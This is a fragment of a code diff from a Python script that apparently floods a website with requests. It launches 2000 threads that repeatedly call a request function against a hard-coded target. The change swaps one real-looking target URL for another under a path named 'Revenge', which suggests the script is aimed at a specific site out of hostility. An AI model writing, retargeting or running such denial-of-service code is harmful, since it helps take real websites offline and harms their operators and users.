@@ -38,7 +38,7 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://omar.x10.mx/omar/public/"
+    target_url = "https://alamdar-mod.com/Revenge/public"
     for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
